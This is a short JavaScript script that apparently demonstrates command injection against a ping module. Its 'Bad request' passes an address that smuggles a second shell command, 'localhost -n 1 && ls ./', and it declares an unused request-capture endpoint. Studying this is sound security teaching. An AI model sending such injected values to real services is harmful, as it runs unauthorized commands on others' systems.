'use strict';

const ping = require('./ping-1');


// Normal request ...
/*
ping.pingServer(
  {body: {address: 'ebay.com'}}, 
  {text: console.log}
);
*/

// Bad request
const endpoint = 'https://requestb.in/1d3o4kp1';
ping.pingServer(
  {body: {address: `localhost -n 1 && ls ./`}}, 
  {text: console.log}
);